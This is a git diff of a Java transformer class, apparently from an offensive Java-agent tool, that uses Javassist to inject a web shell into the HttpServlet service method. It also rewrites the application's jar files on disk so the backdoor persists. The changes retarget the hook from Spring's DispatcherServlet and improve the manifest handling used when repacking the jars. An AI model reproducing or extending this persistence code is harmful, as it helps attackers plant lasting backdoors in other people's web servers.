@@ -9,11 +9,13 @@ import java.io.IOException;
 import java.lang.reflect.Modifier;
 import java.nio.file.Files;
 import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 import java.util.HashSet;
 import java.util.Set;
 import java.util.jar.JarEntry;
 import java.util.jar.JarInputStream;
 import java.util.jar.JarOutputStream;
+import java.util.jar.Manifest;
 import java.util.zip.CRC32;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -26,9 +28,7 @@ import zhouyu.core.util.JavassistUtil;
 public class WriteShellTransformer implements Transformer {
 
     private String[][] methods = new String[][] {
-//        new String[] {"javax/servlet/http/HttpServlet", "javax.servlet.http.HttpServlet", "service", "(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V"},
-        new String[] {"org/springframework/web/servlet/DispatcherServlet", "org.springframework.web.servlet.DispatcherServlet", "doService", "(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V"},
-
+        new String[] {"javax/servlet/http/HttpServlet", "javax.servlet.http.HttpServlet", "service", "(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V"},
     };
 
     private Set<String> cache = new HashSet<>();
@@ -81,7 +81,6 @@ public class WriteShellTransformer implements Transformer {
     private byte[] insertShell(String hookMethod, String hookMethodSignature, ClassLoader loader, byte[] codeBytes, String beforeCode) {
         CtClass ctClass = null;
         try {
-            boolean flag = false;
             ClassPool classPool = ClassPool.getDefault();
             classPool.appendClassPath(new LoaderClassPath(loader));
             classPool.importPackage("java.io.InputStream");
@@ -124,7 +123,7 @@ public class WriteShellTransformer implements Transformer {
         return codeBytes;
     }
 
-    private void overrideClassForJar(String path, byte[] codeBytes) throws IOException {
+    private void overrideClassForJar(String path, byte[] codeBytes) {
         try {
             if (!path.contains("!/")) {
                 if (path.endsWith(".class")) {
@@ -144,11 +143,14 @@ public class WriteShellTransformer implements Transformer {
             String bk = jar.substring(0, index + 1) + "." + jar.substring(index + 1) + ".bk";
             String classPath = paths.length == 2 ? paths[1] : paths[2];
 
-            JarInputStream jarInputStream = new JarInputStream(new FileInputStream(jar));
-            JarOutputStream jarOutputStream = new JarOutputStream(new FileOutputStream(target), jarInputStream.getManifest());
-            JarEntry jarEntry;
             byte[] bytes = new byte[1024];
             int count;
+            JarEntry jarEntry;
+            JarInputStream jarInputStream = new JarInputStream(new FileInputStream(jar));
+            Manifest manifest = getManifest(jarInputStream);
+            JarOutputStream jarOutputStream = manifest == null ?
+                new JarOutputStream(new FileOutputStream(target))
+                : new JarOutputStream(new FileOutputStream(target), manifest);
             while((jarEntry = jarInputStream.getNextJarEntry()) != null) {
                 if (jarEntry.getName().equals(secondJar)) {
                     System.out.println(String.format("替换jar: %s", jarEntry.getName()));
@@ -157,8 +159,11 @@ public class WriteShellTransformer implements Transformer {
                         readByteArrayOutputStream.write(bytes, 0, count);
                     }
                     JarInputStream jarInputStream2 = new JarInputStream(new ByteArrayInputStream(readByteArrayOutputStream.toByteArray()));
+                    manifest = getManifest(jarInputStream2);
                     ByteArrayOutputStream writeByteArrayOutputStream = new ByteArrayOutputStream();
-                    JarOutputStream jarOutputStream2 = new JarOutputStream(writeByteArrayOutputStream, jarInputStream2.getManifest());
+                    JarOutputStream jarOutputStream2 = manifest == null ?
+                        new JarOutputStream(writeByteArrayOutputStream)
+                        : new JarOutputStream(writeByteArrayOutputStream, manifest);
                     JarEntry jarEntry2;
                     while((jarEntry2 = jarInputStream2.getNextJarEntry()) != null) {
                         if (jarEntry2.getName().equals(classPath)) {
@@ -221,11 +226,33 @@ public class WriteShellTransformer implements Transformer {
             jarOutputStream.close();
 
             Files.write(Paths.get(bk), Files.readAllBytes(Paths.get(jar)));
-            Files.write(Paths.get(jar), Files.readAllBytes(Paths.get(target)));
+            Files.write(Paths.get(jar), Files.readAllBytes(Paths.get(target)), StandardOpenOption.WRITE);
             Files.delete(Paths.get(target));
         } catch (IOException e) {
             e.printStackTrace();
         }
 
+    }
+
+    private Manifest getManifest(JarInputStream jarInputStream) throws IOException {
+        Manifest manifest = null;
+        byte[] bytes = new byte[1024];
+        int count;
+        JarEntry jarEntry;
+        if (jarInputStream.getManifest() == null) {
+            while((jarEntry = jarInputStream.getNextJarEntry()) != null) {
+                if (jarEntry.getName().equals("META-INF/MANIFEST.MF")) {
+                    ByteArrayOutputStream readByteArrayOutputStream = new ByteArrayOutputStream();
+                    while ((count = jarInputStream.read(bytes)) != -1) {
+                        readByteArrayOutputStream.write(bytes, 0, count);
+                    }
+                    manifest = new Manifest();
+                    manifest.read(new ByteArrayInputStream(readByteArrayOutputStream.toByteArray()));
+                }
+            }
+        } else {
+            manifest = jarInputStream.getManifest();
+        }
+        return manifest;
     }
 }
